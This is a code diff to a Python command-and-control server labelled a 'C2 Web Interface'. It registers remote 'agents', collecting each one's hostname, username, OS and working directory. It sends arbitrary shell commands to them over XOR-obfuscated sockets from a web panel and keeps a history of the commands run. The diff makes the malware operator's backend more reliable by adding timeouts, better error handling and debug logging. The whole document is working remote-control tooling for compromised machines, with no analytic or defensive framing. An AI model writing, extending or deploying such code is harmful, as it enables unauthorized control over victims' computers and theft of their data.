@@ -30,52 +30,76 @@ class Agent:
         
     def send_command(self, cmd):
         try:
+            # Encrypt command
             encrypted = xor_crypt(cmd.encode())
             self.conn.send(encrypted + b'\n')
             
+            # Receive response
             response = b''
+            self.conn.settimeout(10)  # 10 second timeout
+            
             while True:
-                chunk = self.conn.recv(8192)
-                if not chunk:
-                    break
-                response += chunk
-                if b'\n' in chunk:
+                try:
+                    chunk = self.conn.recv(8192)
+                    if not chunk:
+                        break
+                    response += chunk
+                    if b'\n' in chunk:
+                        break
+                except socket.timeout:
                     break
             
             if response.endswith(b'\n'):
                 response = response[:-1]
             
-            decrypted = xor_crypt(response)
-            self.last_seen = time.time()
-            return decrypted.decode('utf-8', errors='ignore')
+            # Decrypt response
+            if len(response) > 0:
+                decrypted = xor_crypt(response)
+                self.last_seen = time.time()
+                return decrypted.decode('utf-8', errors='ignore')
+            else:
+                return ""
+                
         except Exception as e:
             self.status = "Disconnected"
             return f"Error: {str(e)}"
     
     def parse_sysinfo(self, data):
         try:
-            parts = data.split('|')
-            if len(parts) >= 5:
+            print(f"[DEBUG] Parsing sysinfo: {data}")
+            parts = data.strip().split('|')
+            
+            if len(parts) >= 5 and parts[0] == "SYSINFO":
                 self.hostname = parts[1]
                 self.username = parts[2]
                 self.os = parts[3]
                 self.cwd = parts[4]
-        except:
-            pass
+                print(f"[DEBUG] Parsed: {self.hostname} | {self.username} | {self.os} | {self.cwd}")
+            else:
+                print(f"[DEBUG] Invalid sysinfo format. Parts count: {len(parts)}")
+        except Exception as e:
+            print(f"[ERROR] Failed to parse sysinfo: {e}")
 
 def handle_agent(conn, addr):
     agent = Agent(conn, addr)
+    print(f"[+] New connection from {addr[0]}:{addr[1]}")
     
     try:
+        # Set socket timeout for initial sysinfo
+        conn.settimeout(5)
+        
         # Receive system info
         data = conn.recv(1024)
+        
         if data:
-            sysinfo = data.decode('utf-8', errors='ignore')
+            sysinfo = data.decode('utf-8', errors='ignore').strip()
+            print(f"[DEBUG] Received sysinfo: {sysinfo}")
+            
             agent.parse_sysinfo(sysinfo)
             agents[agent.id] = agent
             command_history[agent.id] = []
             
-            # Notify all clients
+            # Notify all web clients
             socketio.emit('agent_connected', {
                 'id': agent.id,
                 'hostname': agent.hostname,
@@ -83,17 +107,26 @@ def handle_agent(conn, addr):
                 'os': agent.os,
                 'cwd': agent.cwd
             })
+            
+            print(f"[+] Agent registered: {agent.hostname} ({agent.username})")
+        
+        # Remove timeout for command loop
+        conn.settimeout(None)
         
         # Keep connection alive
         while agent.status == "Active":
             time.sleep(1)
             
+    except socket.timeout:
+        print(f"[-] Connection timeout from {addr[0]}:{addr[1]}")
     except Exception as e:
-        print(f"Agent error: {e}")
+        print(f"[!] Agent error: {e}")
     finally:
         if agent.id in agents:
             agents[agent.id].status = "Disconnected"
             socketio.emit('agent_disconnected', {'id': agent.id})
+            print(f"[-] Agent disconnected: {agent.id}")
+        conn.close()
 
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -114,6 +147,7 @@ def index():
 
 @socketio.on('connect')
 def handle_connect():
+    print("[*] Web client connected")
     # Send current agents list
     agent_list = []
     for agent_id, agent in agents.items():
@@ -133,18 +167,26 @@ def handle_command(data):
     agent_id = data['agent_id']
     command = data['command']
     
+    print(f"[*] Executing command on {agent_id}: {command}")
+    
     if agent_id not in agents:
         emit('command_result', {'error': 'Agent not found'})
         return
     
     agent = agents[agent_id]
+    
+    if agent.status != "Active":
+        emit('command_result', {'error': 'Agent is not active'})
+        return
+    
     result = agent.send_command(command)
     
     # Update CWD if cd command
     if command.startswith('cd '):
         lines = result.strip().split('\n')
-        if lines and len(lines[0]) < 100:
+        if lines and len(lines[0]) < 200:  # Reasonable path length
             agent.cwd = lines[0]
+            print(f"[*] Updated CWD: {agent.cwd}")
     
     # Store in history
     command_history[agent_id].append({
@@ -166,4 +208,4 @@ if __name__ == '__main__':
     listener_thread.start()
     
     print("[*] C2 Web Interface starting on http://0.0.0.0:5000")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
